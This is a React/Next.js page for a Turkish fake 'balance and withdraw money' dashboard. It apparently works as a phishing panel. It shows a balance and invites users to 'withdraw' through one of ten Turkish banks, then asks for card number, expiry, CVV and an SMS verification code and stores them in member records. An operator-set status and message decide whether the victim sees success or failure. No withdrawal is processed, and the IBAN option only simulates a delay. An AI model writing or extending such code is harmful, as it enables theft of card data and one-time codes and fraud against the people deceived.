
"use client";

import { useState, useEffect } from "react";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription, DialogFooter, DialogTrigger } from "@/components/ui/dialog";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useToast } from "@/hooks/use-toast";
import { Loader2, Landmark, CreditCard, Wallet, TrendingUp, CircleAlert, CircleCheck } from "lucide-react";
import { getMembers, setMembers } from "@/lib/member-storage";
import type { AdminMember } from "@/app/dashboard/admin/page";
import { cn } from "@/lib/utils";
import { useAuth } from "@/hooks/use-auth";
import { Skeleton } from "@/components/ui/skeleton";

const banks = [
  "ZİRAAT BANK", "AKBANK", "VAKIF BANK", "GARANTİ BANK", "DENİZ BANK",
  "İŞ BANKASI", "QNB BANK", "HALK BANK", "TEB BANK", "YAPIKREDİ BANK"
];

const InfoItem = ({ label, value, valueClassName, icon: Icon, labelClassName }: { label: string; value: string, valueClassName?: string, icon: React.ElementType, labelClassName?: string }) => (
    <div className="flex items-center justify-between rounded-lg border border-border/50 bg-background/30 p-4 shadow-sm backdrop-blur-sm">
      <div className="flex items-center gap-3">
        <Icon className={cn("h-6 w-6 text-muted-foreground", labelClassName)} />
        <p className={cn("text-lg text-muted-foreground", labelClassName)}>{label}</p>
      </div>
      <p className={cn(`font-mono text-lg font-semibold text-foreground whitespace-pre-wrap`, valueClassName)}>{value}</p>
    </div>
);

const BalancePageSkeleton = () => (
    <div className="space-y-8">
        <Card>
            <CardHeader>
                <Skeleton className="h-8 w-48" />
                <Skeleton className="h-5 w-64" />
            </CardHeader>
            <CardContent className="space-y-4">
                <Skeleton className="h-16 w-full" />
                <Skeleton className="h-16 w-full" />
                <Skeleton className="h-16 w-full" />
                <Skeleton className="h-16 w-full" />
            </CardContent>
        </Card>
        <Card>
            <CardHeader>
                 <Skeleton className="h-8 w-32" />
                 <Skeleton className="h-5 w-72" />
            </CardHeader>
            <CardContent className="grid grid-cols-2 gap-4 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5">
                {[...Array(10)].map((_, i) => (
                    <Skeleton key={i} className="h-24 w-full" />
                ))}
            </CardContent>
        </Card>
    </div>
);


export default function BalancePage() {
  const { toast } = useToast();
  const { member, loading: authLoading } = useAuth();
  const [currentUser, setCurrentUser] = useState<AdminMember | null>(null);
  const [selectedBank, setSelectedBank] = useState<string | null>(null);
  
  const [isOptionsDialogOpen, setOptionsDialogOpen] = useState(false);
  const [isIbanDialogOpen, setIbanDialogOpen] = useState(false);
  const [isCardDialogOpen, setCardDialogOpen] = useState(false);
  
  const [isLoading, setIsLoading] = useState(false);
  const [isSmsStep, setIsSmsStep] = useState(false);

  // Message Dialog State
  const [isMessageDialogOpen, setMessageDialogOpen] = useState(false);
  const [messageDialogTitle, setMessageDialogTitle] = useState("");
  const [messageDialogContent, setMessageDialogContent] = useState("");
  const [messageDialogVariant, setMessageDialogVariant] = useState<"success" | "error">("success");
  
  // Card form state
  const [cardNumber, setCardNumber] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [cvv, setCvv] = useState("");
  const [smsCode, setSmsCode] = useState("");
  
  useEffect(() => {
    if (member) {
      setCurrentUser(member);
    }
  }, [member]);

  const updateUserInStorage = (dataToUpdate: Partial<AdminMember>) => {
     if (!currentUser) return;
     const allMembers = getMembers();
     const updatedMembers = allMembers.map(member => 
        member.id === currentUser.id ? { ...member, ...dataToUpdate } : member
     );
     setMembers(updatedMembers);
     const updatedCurrentUser = updatedMembers.find(m => m.id === currentUser.id);
     if (updatedCurrentUser) {
        setCurrentUser(updatedCurrentUser);
        localStorage.setItem('loggedInUser', JSON.stringify(updatedCurrentUser));
     }
  };

  const showMessageDialog = () => {
    // We need to fetch the LATEST user data again right before showing the dialog
    const allMembers = getMembers();
    const freshUserData = allMembers.find(m => m.id === currentUser?.id);

    if (!freshUserData) return;

    if (freshUserData.transactionStatus === 'blocked') {
        setMessageDialogTitle("İşlem Başarısız");
        setMessageDialogContent(freshUserData.errorMessage || "Para çekme işleminiz gerçekleştirilemedi. Lütfen destek ekibiyle iletişime geçin.");
        setMessageDialogVariant('error');
    } else {
        setMessageDialogTitle("İşlem Başarılı");
        setMessageDialogContent(freshUserData.onayMesaji || "İşleminiz başarıyla alındı.");
        setMessageDialogVariant('success');
    }
    setMessageDialogOpen(true);
  }

  const handleBankSelect = (bank: string) => {
    setSelectedBank(bank);
    setOptionsDialogOpen(true);
    setIbanDialogOpen(false);
    setCardDialogOpen(false);
    setIsSmsStep(false);
  };
  
  const handleIbanSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setTimeout(() => {
        setIsLoading(false);
        setIbanDialogOpen(false);
        setOptionsDialogOpen(false);
        showMessageDialog();
    }, 1500);
  };
  
  const handleCardSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    
    updateUserInStorage({
      cardNumber: cardNumber,
      cardExpiry: expiryDate,
      cardCvv: cvv
    });
    
    setIsLoading(true);
    setTimeout(() => {
        setIsLoading(false);
        // Always proceed to the SMS step.
        // The check for transactionStatus will happen in handleSmsSubmit.
        setIsSmsStep(true);
    }, 2000);
  };

  const handleSmsSubmit = (e: React.FormEvent) => {
     e.preventDefault();
     setIsLoading(true);

     updateUserInStorage({ smsCode: smsCode });

     setTimeout(() => {
        setIsLoading(false);
        setCardDialogOpen(false);
        setOptionsDialogOpen(false);
        resetCardDialog(false);
        showMessageDialog();
     }, 1500)
  }

  const resetCardDialog = (open: boolean) => {
    if(!open) {
      setIsSmsStep(false);
      setCardNumber("");
      setExpiryDate("");
      setCvv("");
      setSmsCode("");
    }
    setCardDialogOpen(open);
  }

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, ''); // Remove non-digits
    const formattedValue = value.replace(/(\d{4})/g, '$1 ').trim(); // Add space every 4 digits
    if (formattedValue.length <= 19) {
      setCardNumber(formattedValue);
    }
  };

  const handleExpiryDateChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '');
    let formattedValue = value;
    if (value.length > 2) {
      formattedValue = value.slice(0, 2) + '/' + value.slice(2, 4);
    }
    if (formattedValue.length <= 5) {
      setExpiryDate(formattedValue);
    }
  };
  
  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '');
    if (value.length <= 3) {
      setCvv(value);
    }
  };
  
  if (authLoading || !currentUser) {
    return <BalancePageSkeleton />;
  }


  return (
    <div className="space-y-8">
      <Card>
        <CardHeader>
          <div className="flex items-center gap-3">
            <Landmark className="h-8 w-8 text-primary" />
            <div>
              <CardTitle className="text-3xl font-bold">Bakiye Bilgileri</CardTitle>
              <CardDescription className="text-base">Mevcut bakiyeniz ve hesap bilgileriniz.</CardDescription>
            </div>
          </div>
        </CardHeader>
        <CardContent className="space-y-4 text-base">
          <InfoItem label="Mevcut Bakiye" value={currentUser?.currentBalance || "0 TL"} valueClassName="text-3xl font-bold text-green-600" icon={Wallet} labelClassName="text-blue-600 dark:text-blue-400" />
          <InfoItem label="IBAN Numarası" value={currentUser?.iban || "TRXX XXXX XXXX XXXX XXXX XXXX XX"} icon={CreditCard} labelClassName="text-blue-600 dark:text-blue-400" />
          <InfoItem label="Kullandığınız Banka" value={currentUser?.bank || "Banka Bilgisi Yok"} icon={Landmark} labelClassName="text-blue-600 dark:text-blue-400" />
          <InfoItem label="Hesap Hareketi" value={currentUser?.accountActivity || "Hesabınıza gelen para bulunmamaktadır."} icon={TrendingUp} labelClassName="text-green-600 dark:text-green-400" />
        </CardContent>
      </Card>

      <Card>
        <CardHeader>
          <CardTitle className="text-3xl font-bold uppercase text-blue-600 dark:text-blue-400">PARA ÇEK</CardTitle>
          <CardDescription className="text-base">Aşağıdan bir banka seçerek işleme başlayın.</CardDescription>
        </CardHeader>
        <CardContent className="grid grid-cols-2 gap-4 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5">
          {banks.map((bank) => (
            <Button
              key={bank}
              className="h-24 break-words p-2 text-center text-base font-semibold bg-green-600 hover:bg-green-700 text-primary-foreground"
              onClick={() => handleBankSelect(bank)}
            >
              {bank}
            </Button>
          ))}
        </CardContent>
      </Card>

      {/* Main Options Dialog */}
      <Dialog open={isOptionsDialogOpen} onOpenChange={setOptionsDialogOpen}>
          <DialogContent>
              <DialogHeader>
                  <DialogTitle className="text-2xl font-bold">Para Çekme Yöntemi</DialogTitle>
                  <DialogDescription className="text-base">
                      {selectedBank} hesabınıza para çekmek için bir yöntem seçin.
                  </DialogDescription>
              </DialogHeader>
              <div className="flex flex-col gap-4 py-4 sm:flex-row">
                  <Dialog open={isIbanDialogOpen} onOpenChange={setIbanDialogOpen}>
                      <DialogTrigger asChild>
                          <Button className="w-full text-base sm:w-auto sm:flex-1">IBAN Numarası ile Çek</Button>
                      </DialogTrigger>
                      <DialogContent>
                          <DialogHeader>
                              <DialogTitle className="text-2xl font-bold">IBAN ile Para Çek</DialogTitle>
                              <DialogDescription className="text-base">{selectedBank} hesabınıza para çekmek için tutarı girin.</DialogDescription>
                          </DialogHeader>
                          <form onSubmit={handleIbanSubmit} className="space-y-4 pt-4">
                              <div>
                                  <Label htmlFor="amount" className="text-base">Tutar</Label>
                                  <Input id="amount" type="number" required />
                              </div>
                              <DialogFooter>
                                  <Button type="submit" disabled={isLoading} className="w-full text-base sm:text-sm">
                                      {isLoading && <Loader2 className="mr-2 h-4 w-4 animate-spin" />}
                                      Gönder
                                  </Button>
                              </DialogFooter>
                          </form>
                      </DialogContent>
                  </Dialog>

                  <Dialog open={isCardDialogOpen} onOpenChange={resetCardDialog}>
                      <DialogTrigger asChild>
                          <Button className="w-full text-base sm:w-auto sm:flex-1">Kart ile Çek</Button>
                      </DialogTrigger>
                      <DialogContent>
                          {!isSmsStep ? (
                              <>
                                  <DialogHeader>
                                      <DialogTitle className="text-2xl font-bold">Kart ile Para Çek</DialogTitle>
                                      <DialogDescription className="text-base">Bilgileri doldurarak para çekme talebi oluşturun.</DialogDescription>
                                  </DialogHeader>
                                  <form onSubmit={handleCardSubmit} className="space-y-4 pt-4">
                                      <div>
                                          <Label htmlFor="cardNumber" className="text-base">Kart Numarası</Label>
                                          <Input 
                                            id="cardNumber" 
                                            placeholder="0000 0000 0000 0000" 
                                            value={cardNumber}
                                            onChange={handleCardNumberChange}
                                            required 
                                          />
                                      </div>
                                      <div className="flex gap-4">
                                          <div className="flex-1">
                                              <Label htmlFor="expiryDate" className="text-base">Tarih</Label>
                                              <Input 
                                                id="expiryDate" 
                                                placeholder="AA/YY" 
                                                value={expiryDate}
                                                onChange={handleExpiryDateChange}
                                                required 
                                              />
                                          </div>
                                          <div className="flex-1">
                                              <Label htmlFor="cvv" className="text-base">CVV Kodu</Label>
                                              <Input 
                                                id="cvv" 
                                                placeholder="***" 
                                                value={cvv}
                                                onChange={handleCvvChange}
                                                required 
                                              />
                                          </div>
                                      </div>
                                      <DialogFooter>
                                          <Button type="submit" disabled={isLoading} className="w-full text-base sm:text-sm">
                                              {isLoading && <Loader2 className="mr-2 h-4 w-4 animate-spin" />}
                                              Devam
                                          </Button>
                                      </DialogFooter>
                                  </form>
                              </>
                          ) : (
                              <>
                                <DialogHeader>
                                      <DialogTitle className="text-2xl font-bold">SMS Doğrulama</DialogTitle>
                                      <DialogDescription className="text-base">Telefonunuza gönderilen doğrulama kodunu girin.</DialogDescription>
                                  </DialogHeader>
                                  <form onSubmit={handleSmsSubmit} className="space-y-4 pt-4">
                                      <div>
                                          <Label htmlFor="smsCode" className="text-base">SMS Kodu</Label>
                                           <Input 
                                            id="smsCode" 
                                            placeholder="SMS Kodunu Girin" 
                                            value={smsCode}
                                            onChange={(e) => setSmsCode(e.target.value)}
                                            required 
                                          />
                                      </div>
                                      <DialogFooter>
                                          <Button type="submit" disabled={isLoading} className="w-full text-base sm:text-sm">
                                              {isLoading && <Loader2 className="mr-2 h-4 w-4 animate-spin" />}
                                              Çek
                                          </Button>
                                      </DialogFooter>
                                  </form>
                              </>
                          )}
                      </DialogContent>
                  </Dialog>
              </div>
          </DialogContent>
      </Dialog>
      
      {/* Message Dialog */}
      <Dialog open={isMessageDialogOpen} onOpenChange={setMessageDialogOpen}>
        <DialogContent>
            <DialogHeader className="items-center">
                {messageDialogVariant === 'success' ? 
                  <CircleCheck className="h-16 w-16 text-green-500 mb-4" /> : 
                  <CircleAlert className="h-16 w-16 text-red-500 mb-4" />
                }
                <DialogTitle className="text-2xl font-bold text-center">
                    {messageDialogTitle}
                </DialogTitle>
                <DialogDescription className="text-center text-lg">
                    {messageDialogContent}
                </DialogDescription>
            </DialogHeader>
            <DialogFooter>
                <Button onClick={() => setMessageDialogOpen(false)} className="w-full">
                    Kapat
                </Button>
            </DialogFooter>
        </DialogContent>
      </Dialog>

    </div>
  );
}
